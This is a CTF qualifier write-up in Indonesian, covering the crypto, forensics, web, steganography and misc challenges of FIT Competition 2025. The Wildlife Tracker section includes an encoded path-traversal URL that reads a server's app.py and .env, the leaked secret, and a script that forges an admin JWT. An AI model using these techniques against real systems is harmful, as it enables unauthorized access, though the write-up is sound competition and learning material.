---
title: "FIT Competition 2025 Quals - Writeup"
description: ""
pubDate: 2025-07-13 21:00
slug: "fitcompetition-writeup"
---

## team : llcxmn fanclub

- [CRYPTO](#crypto)
- [Forensics](#forensics)
- [WEB](#web)
- [STEGANO](#stegano)
- [MISC](#misc)

## CRYPTO
### Kunci Veridian (50 Pts)

```
Agen X, jaringan intelijen kami telah mencegat sebuah komunikasi
penting. Sepertinya ini adalah fragmen data terenkripsi dari inisiatif
'Veridian Accord' – sebuah proyek terobosan yang bertujuan untuk
Rekode Bumi (Recode The Earth) melalui reforestasi berbasis AI. Sistem
mereka, 'ArborOS,' adalah mercusuar Inovasi Digital untuk Masa Depan
Berkelanjutan (Digital Innovation For Sustainable Future)
```

Di chall ini diberikan 2 file, yaitu key.hex dan encrypted_message.txt. Tujuannya adalah untuk mendekripsi encrypted_message.txt menggunakan key.hex untuk menemukan flag.

Isi dari key.hex adalah 7265636f64655f7468655f6561727468. Ini adalah string heksadesimal yang, ketika dikonversi ke byte berfungsi sebagai kunci dekripsi.

Sedangkan, encrypted_message.txt berisi pesan terenkripsi dalam format biner.

Lalu, tinggal buat skrip solver untuk mendekripsi pesan. Skrip ini dirancang untuk:

1. Membaca file key.hex dan mengonversi string heksadesimal menjadi byte menggunakan fungsi hex_to_bytes.
2. Membaca file encrypted_message.txt sebagai data biner.
3. Melakukan dekripsi XOR menggunakan fungsi xor_decrypt, yang
mengulang data terenkripsi dan melakukan XOR setiap byte dengan byte
yang sesuai dari kunci (mengulang kunci jika perlu).
4. Mencoba mendekode byte yang didekripsi menjadi string yang dapat dibaca manusia, pertama dengan latin- 1 dan kemudian kembali ke utf- 8 dengan penanganan kesalahan.


```python
def hex_to_bytes(hex_string):
return bytes.fromhex(hex_string)

def xor_decrypt(encrypted_data, key):
decrypted_bytes = bytearray()
key_len = len(key)
for i, byte in enumerate(encrypted_data):
decrypted_bytes.append(byte ^ key[i % key_len])
return decrypted_bytes

def caesar_decrypt(ciphertext, shift):
plaintext = ""
for char in ciphertext:
if 'a' <= char <= 'z':
plaintext += chr(((ord(char) - ord('a') - shift + 26 ) % 26 ) +
ord('a'))
elif 'A' <= char <= 'Z':
plaintext += chr(((ord(char) - ord('A') - shift + 26 ) % 26 ) +
ord('A'))
else:
plaintext += char
return plaintext

def vigenere_decrypt(ciphertext, key):
plaintext = ""
key_index = 0
for char in ciphertext:
if 'a' <= char <= 'z':
shift = ord(key[key_index % len(key)].lower()) - ord('a')
plaintext += chr(((ord(char) - ord('a') - shift + 26 ) % 26 ) +
ord('a'))
key_index += 1
elif 'A' <= char <= 'Z':
shift = ord(key[key_index % len(key)].upper()) - ord('A')

plaintext += chr(((ord(char) - ord('A') - shift + 26 ) % 26 ) +
ord('A'))
key_index += 1
else:
plaintext += char
return plaintext

with open('files/key.hex', 'r') as f:
key_hex = f.read().strip()

with open('files/encrypted_message.txt', 'rb') as f:
encrypted_message_bytes = f.read()

key_bytes = hex_to_bytes(key_hex)
decrypted_bytes = xor_decrypt(encrypted_message_bytes, key_bytes)

try:
decrypted_text = decrypted_bytes.decode('latin- 1 ')
print("XOR Decryption Result:")
print(decrypted_text)
except UnicodeDecodeError:
print("Could not decode with latin-1. Trying utf-8 with errors ignored.")
decrypted_text = decrypted_bytes.decode('utf- 8 ', errors='ignore')
print("XOR Decryption Result:")
print(decrypted_text)
```

### Flag:
```
FITUKSW{d1g1t4l_tr33s_gr0w_str0ng}
```

### From Caesar to Cleo (200 Pts)

```
Apakah kamu tahu isi surat cinta Julius Caesar untuk Cleopatra?
```
Diberi sebuah txt file yang terdiri dari tiga paragraf, di mana setiap paragraf sudah di-encoding. Tebakan pertama adalah Caesar shift sesuai judul prob. Pada paragraph pertama dapat di-decode dengan tiga shift

Kami mencoba submit tapi diberi incorrect, berarti false flag. Pada paragraph kedua, kami sudah mencoba brute force Caesar cipher, tetapi tidak menghasilkan apa-apa. Kami beralih ke vigenere cipher, saat mencoba memasukkan ke dcode.fr

ada beberapa kombinasi yang menghasilkan sesuatu seperti DQBC : It you wold ihis bessokd ib youf hanrw masih terlalu gibberish, kemudian kami mencoba DEBC : If you iold uhis nessakd in your handw, semakin terlihat. 

Berdasarkan observasi kami, cipher ini setidaknya harus memiliki panjang key 5, kamipun mencoba DEFBC dan anehnya hasilnya semakin random. Setelah mengulik lebih jauh, ternyata ciphernya tidak mengabaikan non-alphabet dan benar saja DEFBC menghasilkan If you hold this message in your hands. Jika mulai dari awal paragraph key-nya adalah BCDEF.


```python
def vigenere_decrypt(ciphertext, key):
decrypted = []
key = key.upper()
key_length = len(key)
key_index = 0

for char in ciphertext:
if char.isalpha():
shift = ord(key[key_index % key_length]) - ord('A')
if char.isupper():
decrypted_char = chr((ord(char) - ord('A') - shift) % 26 +
ord('A'))
else:

decrypted_char = chr((ord(char) - ord('a') - shift) % 26 +
ord('a'))
decrypted.append(decrypted_char)

else:
decrypted.append(char)
key_index += 1

return ''.join(decrypted)

ciphertext = """Uq qd gwiwoco qpxh,
Lj zqx mpng yikv rfuvelf lr zqxv icqhx, wljo L mbxh ifhlii prx ppoc gcwi, dxx
ukpi jvviqg. JNUWNWB{ary_bnpsxu_wljsg}
Gdgm nhxyft M tgqh uq ctv pewdjhw xkwl b seyugur bno nuu sbo, e sjbxmn vlfqgg
gz wmrf lxxfni.
Bsz cui ujh hsqzr ph qd gptnsg, fof M zkhpi ob xpwo yp bsz. Oiy VUYXU jyneg
ctv wlwpwjl ujh hjpdp dksljs. JNUWNWB{vki_lgb_nt_WVZTV}"""
key = "BCDEF"

plaintext = vigenere_decrypt(ciphertext, key)
print("Decrypted text:", plaintext)
```

Setelah belajar dari kesalahan sebelumnya kami tidak langsung submit flag. Lanjut ke paragraph tiga, kami menebak paragraph ketiga juga adalah vigenere cipher tapi dengan key TRUST sesuai dengan false flag paragraph kedua. 

Berdasarkan hasil solver tadi, hasilnya random kembali, kami mencoba mengabaikan non-alphabet dan mendapat hasil berupa lanjutan paragraph dan dua flag. Flag yang benar adalah flag terakhir

### Flag:
```
FITUKSW{vigenere_for_everlasting_love}
```

## Forensics
### Secret File (200 Pts)

```
Tobi, seorang pemain crypto, dia pengusaha dan mempunyai lambo
warna ungu.
Suatu hari, dia pengen menghapus file-file yang ngga dibutuhin di PC
nya, tapi Tobi ngga sengaja ngehapus file yang berisi passphrase wallet
yang berisi 5 BTC.
```

Jadi kita diberi link drive yang ada file .zip dan setelah di ekstrak file zip terdapat file yaitu Tobi_Secret_File.E01 dan Tobi_Secret_File.E01.txt

Setelah coba pake tool-tool foren (file, exiftool, dst..) tidak ditemukan something sus, jadi coba analisis hexadecimal

ok dapet..

### Flag:
```
FITUKSW{nice_step_for_better_forensic_master_on_2025_669534}
```

### Martin and the Humming Signal! (300 Pts)

```
Martin tinggal sendirian di ujung gang, rumahnya penuh barang-barang
aneh—dari jam dinding yang berputar mundur sampai radio tua yang
selalu menyala, bahkan saat mati lampu.
Suatu malam, terdengar suara berdesis dari radionya. Martin bilang itu
“pesan penting” yang dikirimkan entah dari siapa... entah dari mana.
Sebelum menghilang, Martin meninggalkan satu file rekaman yang
katanya: “Dengerin baik-baik... mereka cuma bisa bicara lewat cara
ini.” Download Sekarang rekaman itu ada padamu.
```


Diberi sebuah .wav file. Kami menjalankan exiftool, files, strings + grep, binwalk, tidak ada yang aneh. Selanjutnya kami mencoba analisis spectrogram menggunakan Audacity, berikut adalah bentuk spectrogramnya.

Saya sebelumnya belum pernah mengerjakan forensic/steg dari sebuah audio jadi membutuhkan waktu lama. Kami mencoba mencari write up problem dengan bentuk spectrogram yang serupa. Kami mendapat sebuah write up dengan prefix spectrogram yang serupa PlaidCTF 2017 - Misc/Signal Intelligence - Terebeep | bolek42.github.io

Writeup tersebut menyebut bahwa wav tersebut merupakan SSTV (Slow Scan TeleVision) yang merupakan sebuah metode mentransmisikan sebuah gambar dengan menggunakan sinyal radio. Akibat writeup tersebut terlalu technical kami mencoba mengulik writeup lain dengan kata kunci SSTV. Kami mendapat sebuah write up yang mencoba meng-decode SSTV tersebut menggunakan QSSTV. The Transmission: From Creation to Solution Walkthrough | by Mon | Medium.

Akhirnya dengan QSSTV kami mendapat sebuah gambar dengan QR Code yang jika di-decode menghasilkan sebuah base 64


### Flag:
```
FITUKSW{they_sing_in_static_and_dream_in_noise}
```

## WEB
### Power Plant (100 Pts)

```
This power plant's website is open for public viewing, but perhaps
they've been a little too open with certain configurations.
```

Pada challenge ini, kita diberikan sebuah link website, langsung saja kita akses 

Setelah mencari informasi di web ini tidak ditemukan sesuatu yang mencurigakan, oleh karena itu kita coba akses beberapa endpoint penting.

Setelah akses /robots.txt ditemukan informasi berikut

Lalu, coba akses http://20.6.129.177:8081/secret_code.txt, namun mendapat 404 Not Found.

Lalu pada halaman utama tadi terdapat gambar dan setelah di cek untuk direktori lokasi gambar ada di

http://20.6.129.177:8081/static/images/power_plant.png

Kita coba untuk taruh endpoint /secret_code.txt ke dalam /static

### Flag:
```
FITUKSW{b3_ec0_fr13ndly}
```

### Wildlife Tracker (200 Pts)

```
The "Wildlife Tracker" promises to help keep tabs on various species.
However, every good system has its blind spots, and this one might be no
exception. Can you exploit its nuances and gain unauthorized access to
its deeper operations?
```


Diberikan sebuah link website

Di situ ada field untuk mengisi sesuatu, setelah coba lakukan xss, ssti tapi tidak work, berarti bukan itu intended nya. Lalu setelah membuka di bagian

http://134.209.102.23:8082/about, ditemukan seperti ini

http://134.209.102.23:8082/?read_file=wildlife_info.txt

Ada parameter endpoint, jadi bisa directory transversal, setelah coba berkali kali, akhirnya kita menemukan formula untuk bypass nya. Karena setelah cek etc/passwd no ingfo, jadi coba guessing supaya dapet konfigurasi web.

Dan dapet cik lesgoo

http://134.209.102.23:8082/?read_file=/%2e%2e%2f/%2e%2e%2f/%2e%2e%2f/%2e%2e%2fapp.py


```python
from flask import Flask, request, render_template, make_response, send_file
import os
import jwt
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)

app.config['SECRET_KEY'] = os.getenv('SECRET_KEY',
'default_fallback_ctf_key_NOT_SECURE_IN_PROD')

JWT_ALGORITHM = "HS256"

if not app.config['SECRET_KEY'] or app.config['SECRET_KEY'] == \
'default_fallback_ctf_key_NOT_SECURE_IN_PROD':
print("WARNING: SECRET_KEY not set in .env or environment variables. Using \
a default fallback key.")
print("This default key can be used if .env is not found, making the \
challenge easier if known.")

basedir = os.path.abspath(os.path.dirname(__file__))

FLAG_FILE = os.path.join(os.path.dirname(basedir), 'forbidden', 'flag.txt')

def is_safe(input_string):
"""
Checks if the input string contains potentially dangerous HTML or script
tags.
This function specifically targets '<script' and the combination of 'on'
and '='.
The CTF challenge solution leverages JavaScript pseudo-protocol with encoded
characters to bypass this particular filter.
"""
input_lower = input_string.lower()
if "<script" in input_lower:
return False
if "on" in input_lower and "=" in input_lower:
return False
return True

@app.route('/', methods=['GET', 'POST'])
def index():
"""
Handles the main page where users can submit wildlife observations.

It also contains the LFI vulnerability, triggered by a 'read_file' query
parameter.
If 'read_file' is present, it attempts to read and display the file.
Otherwise, it processes observation submissions.
"""
filename_to_read = request.args.get('read_file')
if filename_to_read:
base_dir = os.getcwd()

file_path = os.path.join(base_dir, filename_to_read)
abs_file_path = os.path.abspath(file_path)

if not abs_file_path.startswith(base_dir):
return "Access denied: Path traversal detected!", 403

try:
return send_file(abs_file_path, mimetype='text/plain')
except FileNotFoundError:
return f"File '{filename_to_read}' not found.", 404
except IsADirectoryError:
return f"'{filename_to_read}' is a directory, not a file.", 400
except Exception as e:
return f"Error reading file: {e}", 500

observation = ""
if request.method == 'POST':
observation = request.form.get('observation', '')
if not is_safe(observation):
observation = "Your observation was flagged as potentially \
disruptive and has been filtered. Try again with safe content!"

return render_template('index.html', observation=observation)

@app.route('/admin_dashboard')
def admin_dashboard():
"""
Handles access to the administrative dashboard.
Access is granted only if a valid JWT 'admin_token' cookie is present and
verified.
The flag is loaded dynamically from an external file after authentication.
"""
admin_token_cookie = request.cookies.get('admin_token')
is_admin_authorized = False
flag = "Flag not found or unauthorized."

if admin_token_cookie:

try:
token_data = jwt.decode(
admin_token_cookie,
app.config['SECRET_KEY'],
algorithms=[JWT_ALGORITHM]
)

if token_data.get('role') == 'admin' and \
token_data.get('authorized') == True:
is_admin_authorized = True
except jwt.ExpiredSignatureError:
print("Admin token expired.")
is_admin_authorized = False
except jwt.InvalidTokenError as e:
print(f"Invalid admin token: {e}")
is_admin_authorized = False
except Exception as e:
print(f"Unexpected error processing token: {e}")
is_admin_authorized = False

if is_admin_authorized:
try:
with open(FLAG_FILE, 'r') as f:
flag = f.read().strip()
except FileNotFoundError:
print(f"ERROR: Flag file not found at {FLAG_FILE}")
flag = "CTF Flag file missing on server."
except Exception as e:
print(f"ERROR: Could not read flag file: {e}")
flag = "Error loading CTF flag."

return render_template('admin.html', flag=flag)
else:
response = make_response(render_template('unauthorized.html'), 401)
response.headers['WWW-Authenticate'] = 'Basic realm="Admin Required"'
return response

@app.route('/about')
def about():
return render_template('about.html')

@app.route('/observations')
def observations():
return render_template('observations.html')

@app.route('/unauthorized')
def unauthorized():
return render_template('unauthorized.html')

if __name__ == '__main__':
app.run(debug=False, host='0.0.0.0', port=8082)
```


Ok dari program tersebut kita bisa tau algoritma buat token admin login nya, tapi kita belum tau secret key buat token nya, dari situ diketahui kalo secret disimpan di .env

Kita coba akses file env nya melalui teknik yang sama

http://134.209.102.23:8082/?read_file=/%2e%2e%2f/%2e%2e%2f/%2e%2e%2f/%2e%2e%2f.env

```
SECRET_KEY=wildlife- 2025 - fit-challenge-secret
```

Karena udah dapet semua tinggal kita buat program untuk generate token berdasarkan algoritma dan secret key tersebut.


```python
import jwt
import datetime

# From app.py
SECRET_KEY = "wildlife-2025-fit-challenge-secret"
JWT_ALGORITHM = "HS256"

def generate_admin_token():
payload = {
'role': 'admin',
'authorized': True,
'exp': datetime.datetime.utcnow() + datetime.timedelta(hours=1) # Token
expires in 1 hour
}
token = jwt.encode(payload, SECRET_KEY, algorithm=JWT_ALGORITHM)
return token

if __name__ == '__main__':
admin_token = generate_admin_token()
print(f"Generated Admin Token: {admin_token}")
```

Setelah dapet cookies token nya tinggal set dan akses /admin_dashboard


### Flag:
```
FITUKSW{b10d1v3rsqty_1n_th3_w1ld}
```

## STEGANO
### Ez-Stegano (150 Pts)

Ada sebuah file EASY.jpg dimana file tersebut tersimpan file .txt

Diberi sebuah jpg file :

Sesuai dengan judul soal, kami mencoba solve prob dengan stegano tanpa password. Kami menggunakan tool berikut Steganographic Decoder

### Flag:
```
FITUKSW{FT1K4ub3r4ada}
```

### Med - Stegano (150 Pts)


Ada sebuah file EASY.jpg dimana file tersebut tersimpan file .txt

Kami mencoba dengan tool pada Ez-Stegano, tetapi tidak menghasilkan apa-apa. Kami melihat exiftool, binwalk, files, strings + grep tidak memberi hasil. Setelah itu kami mencoba crack steg with stegcracker dengan password pada wordlist rockyou.txt

Berhasil di-crack dengan password 123.

### Flag:
```
FITUKSW{D4r4hb1ruFt1}
```

## MISC
### Bukti Fana (50 Pts)

```
Tim kami menemukan sebuah program misterius dari server peretas.
Temukan pesan tersembunyi dari program tersebut. Download disini.
```

Diberi sebuah exe file. Kami menjalankan exe tersebut (gw takut cik panit ngasi malware, pls jangan gw masi saya mesin gw). Program tersebut mengeluarkan output berupa sebuah file bernama arboros_20250704_203435 yang dari isinya seperti log file. Pada ss_data terlihat memiliki value berupa base64, kami mencoba decode sebagian dari prefix base64 tersebut.

JFIF mengindikasikan bahwa value ss_data adalah data sebuah JPG file yang di-encode ke base64. Kami mencoba meng-convert datanya menjadi sebuah JPG file.

JPG file tersebut ternyata screenshot dari desktop mesin saya.

Dengan menjalankan exiftool, kami mendapat dua flag, kami sempat khawatir bahwa keduanya adalah false flag karena terasa terlalu gampang. Kami punmencoba submit flag pada Image Description dan beruntungnya kami diberi hasil correct.

### Flag:
```
FITUKSW{watch_what_you_see}
```

### ThePowerOfLogs (200 Pts)

```
Sebuah organisasi lingkungan bawah tanah yang dikenal sebagai
Veridian Accord diduga merencanakan aksi skala besar untuk "merekode
ulang bumi". Selama penggerebekan markas salah satu anggotanya, tim
forensik menemukan printer tua yang tampaknya telah digunakan untuk
mencetak sesuatu — tapi alih-alih hasil cetakan biasa, hanya file log
sistem internal yang berhasil dipulihkan. Log tersebut tampak seperti
catatan aktivitas sistem bus data atau debug perangkat keras, dengan
format yang tidak lazim. periksalah log tersebut untuk memahami isi
sebenarnya. Mungkinkah ada sesuatu yang mereka sembunyikan?
```


Diberi sebuah log file bernama printer_log, yang berisi seperti berikut :

Problem klasik ctf yang mengubah log dari sebuah printer menjadi sebuah gambar. Pada setiap baris pada log mengartikan :

tx : koordinat x dari sebuah pixel

ty : (thank you) koordinat y dari sebuah pixel

packet : tiga nilai RGB (kiri Red, tengah Green, kanan Blue)


```python
from PIL import Image
import re

with open("printer_log.txt", "r") as f:
lines = f.readlines()

pixels = []
max_x = 0
max_y = 0

pattern = re.compile(r'tx=(\d+), ty=(\d+)\s+:: packet:\s+(\d+).(\d+).(\d+)')
for line in lines:
match = pattern.search(line)
if match:
x, y = int(match[1]), int(match[2])
r, g, b = int(match[3]), int(match[4]), int(match[5])
pixels.append((x, y, (r, g, b)))
max_x = max(max_x, x)
max_y = max(max_y, y)

img = Image.new("RGB", (max_x + 1, max_y + 1), color=(0, 0, 0))

for x, y, color in pixels:
img.putpixel((x, y), color)

img.save("output.png")
```

### Flag:
```
FITUKSW{r3c0d3_th3_34rth_1s_3451}
```
